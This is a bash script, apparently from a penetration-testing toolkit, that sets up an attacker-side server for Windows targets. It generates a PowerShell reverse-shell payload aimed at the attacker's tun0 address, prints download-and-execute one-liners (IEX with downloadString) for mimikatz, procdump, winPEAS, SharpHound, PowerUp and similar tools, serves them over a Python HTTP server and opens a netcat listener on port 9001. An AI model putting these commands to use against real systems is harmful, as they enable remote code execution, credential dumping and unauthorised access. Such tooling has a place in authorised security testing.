#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                                Windows HTTP Server 
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display my universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

clear
echo "\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
echo "\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
echo "\t \ \ /\ / / | ||  \| | | | | | | \ \ /\ / /\___ \  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | "
echo "\t  \ V  V /  | || |\  | |_| | |_| |\ V  V /  ___) | |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  "
echo "\t   \_/\_/  |___|_| \_|____/ \___/  \_/\_/  |____/  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ "
echo "\t                                                                                                                    "
echo "\t                                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                               "
echo "\n"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Start the HTTP Server.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
cp template.txt reverseshell.ps1

filename="file.txt"
while read line
  do 
  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 9001" >> reverseshell.ps1
done < $filename

mv ./reverseshell.ps1 ./PowerShell/reverseshell.ps1

echo "Instructions: START PowerShell -ExecutionPolicy Unrestricted -NoProfile\n"

filename="file.txt"
while read line
  do 
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/reverseshell.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/jawsenum.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/powerup.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/powercat.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/minidump.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/mimikatz.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/winpwn.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/powerview.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/LovelyPotato/lovelypotato.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/BloodHound/sharphound.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/BloodHound/sharphound.exe')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/WinPEAS/winPEAS32.exe')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/WinPEAS/winPEAS64.exe')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/ProcDump/procdump32.exe')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/Procdump/procdump64.exe')\"" 
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz64.exe')\"" 
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz32.exe')\"" 
done < $filename

echo ""
exec python -m SimpleHTTPServer > output.txt &
rlwrap nc -lvnp 9001

#Eof
